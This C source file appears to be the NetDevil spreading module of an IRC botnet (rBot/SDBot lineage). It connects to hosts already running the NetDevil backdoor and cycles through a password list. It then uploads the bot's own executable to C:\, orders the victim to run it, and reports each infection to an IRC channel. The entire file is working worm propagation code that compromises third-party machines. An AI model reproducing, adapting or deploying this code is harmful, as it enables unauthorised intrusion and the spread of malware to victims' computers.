#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_NETDEVIL

int NetDevil_Receive(SOCKET ssock)
{
	TIMEVAL timeout;
    timeout.tv_sec = 30;//timeout after 30 sec.
    timeout.tv_usec = 0;

   	fd_set fd_struct;
   	FD_ZERO(&fd_struct);
    FD_SET(ssock, &fd_struct);

	if (fselect(0, &fd_struct, NULL, NULL, &timeout) <= 0) {
		fclosesocket(ssock); 
		return -1;
	}

	return 0;
}

int NetDevil_Upload(char *IP, SOCKET ssock)
{
	SOCKET nsock;
	char buffer[1024], botfile[MAX_PATH], rFile[MAX_PATH];

	int port = 0,bytes_sent = 0;
	unsigned int Fsend = 1024, Fsize, move;
	DWORD mode = 0;

	BOOL ver15 = FALSE;

	GetModuleFileName(NULL, botfile, sizeof(botfile));

	fsend(ssock, "version", 7, 0);
	memset(buffer,0,sizeof(buffer));
	frecv(ssock, buffer, sizeof(buffer), 0);
	if (strlen(buffer) > 5) {
		buffer[strlen(buffer)-2] = '\0';
		char *uPort = strrchr(buffer, '\n\r');
		if (uPort != NULL) 
			port = atoi(uPort);
	}

	char *ver = strtok(buffer,"\n\r");
	if (strcmp(buffer,"ver1.5") == 0) 
		ver15 = TRUE; 
	sprintf(rFile,"C:\\%s",filename);

	port = ((port == 0)?(903):(port));
	if ((nsock = CreateSock(IP,port)) == INVALID_SOCKET) 
		goto end;

	HANDLE testfile; 
	if ((testfile = CreateFile(botfile,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0)) == INVALID_HANDLE_VALUE) 
		goto end;
	Fsize = GetFileSize(testfile,NULL);

	if (ver15)
		sprintf(buffer,"cmd[003]%s|%i|\n\r",rFile,Fsize);
	else
		sprintf(buffer,"%s\r1",rFile);
	fsend(nsock, buffer, strlen(buffer), 0);
	if (frecv(nsock, buffer, sizeof(buffer), 0) < 1) 
		goto end;

	while (Fsize) {
		memset(buffer,0,sizeof(buffer));

		if (Fsend>Fsize) 
			Fsend=Fsize;
		move = 0-Fsize;

		SetFilePointer(testfile, move, NULL, FILE_END);
		ReadFile(testfile, buffer, Fsend, &mode, NULL);
		bytes_sent = fsend(nsock, buffer, Fsend, 0);
		if (bytes_sent == SOCKET_ERROR) {
			if (fWSAGetLastError() != WSAEWOULDBLOCK) 
				goto end;
			else 
				bytes_sent = 0;
		}
		Fsize = Fsize - bytes_sent;

		if (!ver15 && frecv(nsock, buffer, sizeof(buffer), 0) < 1) 
			goto end;
	}

	if (testfile != INVALID_HANDLE_VALUE) 
		CloseHandle(testfile);
	fclosesocket(nsock);
	Sleep(2000);

	sprintf(buffer,"pleaz_run%s",rFile);
	fsend(ssock, buffer,strlen(buffer), 0);
	memset(buffer,0,sizeof(buffer));
	if (frecv(nsock, buffer, sizeof(buffer), 0) < 1) 
		goto end;
	if (strcmp(buffer,"pleaz_run_done") != 0) 
		goto end;

	Sleep(4000);
	fclosesocket(ssock);

	return 1;

	end:;
	fclosesocket(nsock);
	fclosesocket(ssock);

	return 0;
}

BOOL NetDevil(EXINFO exinfo)
{
	char buffer[IRCLINE];
	DWORD mode=0;

	SOCKET ssock;
	if ((ssock = fsocket(AF_INET,SOCK_STREAM,0)) == INVALID_SOCKET) 
		return FALSE;

	SOCKADDR_IN sin;
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = finet_addr(exinfo.ip);
	sin.sin_port = fhtons((unsigned short)exinfo.port);

	fconnect(ssock,(LPSOCKADDR)&sin,sizeof(sin));
	fioctlsocket(ssock,FIONBIO,&mode);

	for (int i=0; passwords[i]; i++) {
		Sleep(50);

		memset(buffer,0,sizeof(buffer));

		if (NetDevil_Receive(ssock) == -1) 
			break;
		if (frecv(ssock, buffer, sizeof(buffer), 0) <= 0) 
			break;
		if (strcmp(buffer,"passed") == 0) {
			sprintf(buffer,"nd %s %s",exinfo.ip ,passwords[i-1]); 
			fsend(ssock, buffer, strlen(buffer), 0);	

			if (NetDevil_Upload(exinfo.ip,ssock) == 1) {
				fclosesocket(ssock);

				_snprintf(buffer,sizeof(buffer),"[%s]: Exploiting IP: %s, Password: (%s)",exploit[exinfo.exploit].name,exinfo.ip,((strcmp(passwords[i-i],"")==0)?("(no password)"):(passwords[i-1])));
				if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
				addlog(buffer);
				exploit[exinfo.exploit].stats++;

				return TRUE;
			}
			break;	
		}
		if (strcmp(buffer,"pass_pleaz") == 0) {
			memset(buffer,0,sizeof(buffer));
			sprintf(buffer,"pass_pleaz%s",passwords[i]); 
			fsend(ssock,buffer ,strlen(buffer), 0);

			continue;
		}
		else break;
	}
	fclosesocket(ssock);

	return FALSE;
}
#endif
